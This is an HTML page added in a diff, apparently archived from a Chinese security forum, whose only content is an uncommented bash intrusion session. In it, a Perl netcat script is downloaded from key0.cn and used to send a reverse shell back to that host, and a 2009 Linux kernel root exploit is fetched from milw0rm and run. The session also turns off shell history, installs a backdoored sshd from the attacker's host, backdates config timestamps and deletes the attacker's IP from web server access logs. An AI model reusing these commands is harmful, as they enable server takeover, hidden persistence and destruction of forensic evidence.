@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <link rel="stylesheet" href="bootstrap.css">
+    <link rel="stylesheet" href="bootstrap-bbs.css">
+    <link rel="stylesheet" href="kanxue.css">
+	<link rel="stylesheet" type="text/css" href="syntax.css">
+    <meta charset="utf-8">
+    <title>一代传奇</title>
+</head>
+<body>
+    <main id="body">
+                        <div class="message" isfirst="1">
+                            <input type="hidden" id="content_show" value="1">
+
+                            <table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  bash"><tbody><tr><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="bash plain">site:motteke.lovepeas.net</code></div><div class="line number2 index1 alt1"><code class="bash functions">ls</code>&nbsp;<code class="bash plain">-la</code></div><div class="line number3 index2 alt2"><code class="bash functions">id</code></div><div class="line number4 index3 alt1"><code class="bash plain">wget&nbsp;</code><code class="bash string">"http://key0.cn/linuxexp/nc.pl"</code></div><div class="line number5 index4 alt2"><code class="bash functions">ls</code><code class="bash plain">|</code><code class="bash functions">grep</code>&nbsp;<code class="bash plain">nc.pl&nbsp;</code></div><div class="line number6 index5 alt1"><code class="bash functions">ssh</code>&nbsp;<code class="bash plain">-l&nbsp;root&nbsp;key0.cn&nbsp;</code></div><div class="line number7 index6 alt2"><code class="bash plain">nc&nbsp;-lvp&nbsp;222</code></div><div class="line number8 index7 alt1"><code class="bash plain">perl&nbsp;nc.pl&nbsp;key0.cn&nbsp;222</code></div><div class="line number9 index8 alt2"><code class="bash functions">uname</code>&nbsp;<code class="bash plain">-a</code></div><div class="line number10 index9 alt1"><code class="bash functions">rm</code>&nbsp;<code class="bash plain">-rf&nbsp;nc.pl&nbsp;</code></div><div class="line number11 index10 alt2"><code class="bash functions">cd</code>&nbsp;<code class="bash plain">/tmp</code></div><div class="line number12 index11 alt1"><code class="bash functions">mkdir</code>&nbsp;<code class="bash plain">...</code></div><div class="line number13 index12 alt2"><code class="bash functions">cd</code>&nbsp;<code class="bash plain">...</code></div><div class="line number14 index13 alt1"><code class="bash plain">wget&nbsp;</code><code class="bash string">"http://milw0rm.com/sploits/2009-linux-sendpage3.tar.gz"</code></div><div class="line number15 index14 alt2"><code class="bash functions">tar</code>&nbsp;<code class="bash plain">zxvf&nbsp;2009*</code></div><div class="line number16 index15 alt1"><code class="bash functions">cd</code>&nbsp;<code class="bash plain">linux*</code></div><div class="line number17 index16 alt2"><code class="bash functions">ls</code>&nbsp;<code class="bash plain">-l&nbsp;</code></div><div class="line number18 index17 alt1"><code class="bash plain">.</code><code class="bash plain">/run</code>&nbsp;</div><div class="line number19 index18 alt2"><code class="bash functions">export</code>&nbsp;<code class="bash plain">HISTFILE=</code><code class="bash plain">/dev/null</code></div><div class="line number20 index19 alt1"><code class="bash functions">export</code>&nbsp;<code class="bash plain">HISTSIZE=0</code></div><div class="line number21 index20 alt2"><code class="bash functions">mv</code>&nbsp;<code class="bash plain">/etc/ssh/ssh_config</code>&nbsp;<code class="bash plain">/etc/ssh/ssh_config</code><code class="bash plain">.old</code></div><div class="line number22 index21 alt1"><code class="bash functions">mv</code>&nbsp;<code class="bash plain">/etc/ssh/sshd_config</code>&nbsp;<code class="bash plain">/etc/ssh/sshd_config</code><code class="bash plain">.old</code></div><div class="line number23 index22 alt2"><code class="bash plain">wget&nbsp;http:</code><code class="bash plain">//key0</code><code class="bash plain">.cn</code><code class="bash plain">/linuxexp/bd/sshd</code><code class="bash plain">.tgz&nbsp;</code></div><div class="line number24 index23 alt1"><code class="bash functions">tar</code>&nbsp;<code class="bash plain">xzvf&nbsp;sshd.tgz&nbsp;</code></div><div class="line number25 index24 alt2"><code class="bash plain">.</code><code class="bash plain">/configure</code>&nbsp;<code class="bash plain">--prefix=</code><code class="bash plain">/usr</code>&nbsp;<code class="bash plain">--sysconfdir=</code><code class="bash plain">/etc/ssh</code>&nbsp;</div><div class="line number26 index25 alt1"><code class="bash functions">make</code><code class="bash plain">;</code><code class="bash functions">make</code>&nbsp;<code class="bash functions">install</code></div><div class="line number27 index26 alt2"><code class="bash functions">cp</code>&nbsp;<code class="bash plain">ssh_config&nbsp;sshd_config&nbsp;</code><code class="bash plain">/etc/ssh</code>&nbsp;</div><div class="line number28 index27 alt1"><code class="bash functions">touch</code>&nbsp;<code class="bash plain">-r&nbsp;</code><code class="bash plain">/etc/ssh/ssh_config</code><code class="bash plain">.old&nbsp;</code><code class="bash plain">/etc/ssh/ssh_config</code></div><div class="line number29 index28 alt2"><code class="bash functions">touch</code>&nbsp;<code class="bash plain">-r&nbsp;</code><code class="bash plain">/etc/ssh/sshd_config</code><code class="bash plain">.old&nbsp;</code><code class="bash plain">/etc/ssh/sshd_config</code>&nbsp;</div><div class="line number30 index29 alt1"><code class="bash plain">/etc/init</code><code class="bash plain">.d</code><code class="bash plain">/sshd</code>&nbsp;<code class="bash plain">restart</code></div><div class="line number31 index30 alt2"><code class="bash functions">ifconfig</code>&nbsp;</div><div class="line number32 index31 alt1"><code class="bash plain">ssl&nbsp;-l&nbsp;root&nbsp;61.122.86.2</code></div><div class="line number33 index32 alt2"><code class="bash functions">export</code>&nbsp;<code class="bash plain">HISTFILE=</code><code class="bash plain">/dev/null</code>&nbsp;</div><div class="line number34 index33 alt1"><code class="bash functions">export</code>&nbsp;<code class="bash plain">HISTSIZE=0</code></div><div class="line number35 index34 alt2"><code class="bash functions">cd</code>&nbsp;<code class="bash plain">/etc/httpd/logs</code></div><div class="line number36 index35 alt1"><code class="bash functions">sed</code>&nbsp;<code class="bash plain">-i&nbsp;</code><code class="bash string">'/115.60.133.168/d'</code>&nbsp;<code class="bash plain">access_log*</code></div><div class="line number37 index36 alt2"><code class="bash plain">15&nbsp;year&nbsp;ago</code></div></div></td></tr></tbody></table>
+                            <br>
+                           
+
+
+
+                            
+
+
+
+
+
+
+                        </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+                        <div>
+                        </div>
+
+
+                   
+
+
+
+
+
+
+
+
+
+
+
+
+       
+
+
+
+
+
+
+
+    </main>
+</body>
+</html>
